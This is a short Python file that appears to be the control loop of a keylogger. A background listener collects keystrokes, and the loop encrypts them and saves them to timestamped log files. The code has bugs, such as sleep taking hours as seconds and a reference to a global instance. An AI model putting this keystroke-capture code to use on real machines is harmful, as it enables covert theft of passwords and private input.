import threading
from time import sleep
from listener import Listener
from data_collector import Package
from time_stamp import time_stamp2
from encrypt import Encryption
from file_test import log

class Manager:
    def __init__(self, hours = 5):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)
        self.hours = hours
    def start(self):
        self.process.start()
        while True:
            sleep(self.hours)
            data = p.listener.get_keys()
            if data:
                data = Package(data)
                package_data = data.export_package()
                encryptor = Encryption()
                encryptor.encrypt_text(str(package_data))
                encrypted_packege = encryptor.encrypted
                print(package_data)
                print(encrypted_packege)
                times = f'{time_stamp2()}.txt'
                print(times)
                ett = str(encrypted_packege)
                log(times, ett)
    def stop(self):
        self.listener.stop()


if __name__ == '__main__':

    p = Manager()
    p.start()